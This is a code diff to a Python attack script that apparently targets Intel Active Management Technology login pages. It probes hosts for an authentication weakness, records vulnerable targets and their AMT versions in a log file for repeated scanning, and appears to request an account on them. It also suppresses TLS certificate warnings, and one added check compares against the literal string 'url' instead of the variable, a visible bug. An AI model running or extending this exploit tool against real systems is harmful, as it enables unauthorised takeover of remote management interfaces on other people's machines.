@@ -1,8 +1,13 @@
-from urllib3.exceptions import InsecureRequestWarning
-from  urllib3 import disable_warnings
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 import requests
 from user_agent import generate_user_agent
 from bs4 import BeautifulSoup
+# disable warning
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
 
 def obtain_header(s, url):
     # to obtain header nonce
@@ -38,8 +43,14 @@ def obtain_header(s, url):
     soup = BeautifulSoup(res.text, 'html.parser')
     if 'Copyright' in res.text:
         print('\n[+] Woah, it\'s Vulnerable as F*CK !?')
-        print('\t => %s\n' % soup.find('h1', {'class':'tm', 'align':'center'}).text)
-        return True
+        version = soup.find('h1', {'class':'tm', 'align':'center'}).text.replace(' Active Management Technology ', ' AMT ').strip('All Rights Reserved.   ')
+        print('\t => %s\n' % version)
+        if url in open('vuln_server.txt', 'r').read():
+            print('\n\t[*] target is already on the log file')
+            return False
+        else:
+            open('vuln_server.txt', 'a').write('{0}\t\t= {1}\n'.format(url, version))
+            return True
     else:
         print('\n[-] Not VUlnerAble ?')
         return False
@@ -145,9 +156,16 @@ def req_account(s, url):
 
 
 if __name__ == '__main__':
+    print(
+'''
+____________INTEL_GOES_SKRAAAAAA____________
+|=''')
     while True:
         s = requests.Session()
-        url = str(input('\n> '))
+        url = str(input('|> '))
+        if 'url' in open('vuln_server.txt', 'r').read():
+            print('\n\t[*] target is already on the log file')
+            continue
         s.headers['User-Agent'] = generate_user_agent()
         # first request to obtain realm + digest
         check=obtain_header(s, url)
